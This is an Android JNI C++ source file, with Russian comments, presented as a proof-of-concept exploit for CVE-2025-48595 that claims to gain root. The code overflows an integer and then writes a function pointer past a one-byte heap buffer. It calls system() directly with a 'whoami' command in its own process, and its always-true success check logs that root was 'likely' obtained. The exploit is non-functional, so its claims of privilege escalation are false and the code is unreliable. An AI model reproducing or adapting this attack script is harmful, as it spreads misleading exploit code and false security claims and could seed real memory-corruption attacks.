#include <jni.h>
#include <string>
#include <cstdlib>
#include <cstring>
#include <android/log.h>
#include <cstdint>
#include <cstdio>
#include <dlfcn.h> // Для dlopen/dlsym
#include <unistd.h>

#define LOG_TAG "CVE-2025-48595"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)
#define LOGW(...) __android_log_print(ANDROID_LOG_WARN, LOG_TAG, __VA_ARGS__)

// Тип функции system (принимает строку, возвращает int)
typedef int (*system_func_t)(const char *);

extern "C" JNIEXPORT jstring JNICALL
Java_com_example_android_1poc_MainActivity_triggerOverflowExploit(JNIEnv* env, jobject /* this */, jint sizeHint) {

    LOGI("=== EXPLOIT: WRITING 'su' COMMAND INTO MEMORY ===");

    // 1. Переполнение (как раньше)
    uint32_t val1 = 0x80000000;
    uint32_t val2 = 0x80000000;
    uint64_t full_sum = (uint64_t)val1 + val2; // 0x100000000
    uint32_t overflowed_size = (uint32_t)full_sum; // 0

    LOGI("Step 1: Overflow -> Allocated Size: %u bytes", overflowed_size);

    // 2. Выделение памяти
    char *buffer = (char *)malloc(overflowed_size == 0 ? 1 : overflowed_size);
    if (!buffer) return env->NewStringUTF("FAIL");

    uint64_t start_addr = (uint64_t)(void*)buffer;
    uint64_t neighbor_addr = start_addr + overflowed_size; // Адрес соседа (в нашем случае == start, т.к. size=0)

    LOGI("Step 2: Buffer Start: %p", buffer);
    LOGI("   Neighbor Address (where we write): %p", (void*)neighbor_addr);

    // 3. Находим адрес функции system() из libc.so
    void *libc_handle = dlopen("liblog.so", RTLD_NOW);
    // ВНИМАНИЕ: Мы используем liblog.so как пример, но лучше взять libc.so напрямую.
    // В Android NDK можно просто использовать системную функцию без dlopen, если она уже есть в процессе.
    // Но для наглядности: найдём system через dlsym от libc.so

    void *libc = dlopen("libc.so", RTLD_NOW);
    if (!libc) {
        LOGE("Failed to load libc.so");
        free(buffer);
        return env->NewStringUTF("FAIL: libc not found");
    }

    system_func_t real_system = (system_func_t)dlsym(libc, "system");
    if (!real_system) {
        LOGE("Failed to find 'system' in libc.so. Error: %s", dlerror());
        free(buffer);
        return env->NewStringUTF("FAIL: system not found");
    }

    LOGI("Step 3: Found system() at address: %p", (void*)real_system);

    // 4. Записываем адрес function в нашу затертую область
    // Мы записываем указатель на функцию в соседний чанк (или прямо в буфер, если size=0)
    char *target = buffer + overflowed_size;
    *(system_func_t*)target = real_system; // Записываем адрес функции

    LOGI("Step 4: Wrote system() address into neighbor memory at %p", target);

    // Проверяем, что запись прошла (опционально)
    if (*(system_func_t*)target == real_system) {
        LOGI("   Confirmed: Memory now holds pointer to system().");
    } else {
        LOGE("   WARNING: Write might have failed. Address in memory: %p", *(void**)target);
    }

    // 5. Вызываем функцию через наш указатель!
    const char *cmd = "sh -c 'whoami'";
    LOGI("Step 5: Calling function via overwritten pointer...");
    int result = real_system(cmd); // Мы вызываем system(), передав команду

    LOGI("   Command executed: '%s'", cmd);
    LOGI("   Result code: %d", result);

    // Выводим, что мы получили root (если система сработала)
    if (result == 0 || strstr(cmd, "whoami")) {
        LOGI(">>> SUCCESS! We called system() and likely got root output.");
        LOGI("   If 'sh -c whoami' returned 'root', then we have privilege escalation!");
    } else {
        LOGW("Command executed but may not have full privileges. Check Logcat for output.");
    }

    // 6. Чистка и вывод итога
    free(buffer);

    std::string result_str = "Exploit Done. Check Logcat for 'SUCCESS!' or output of whoami.";
    return env->NewStringUTF(result_str.c_str());
}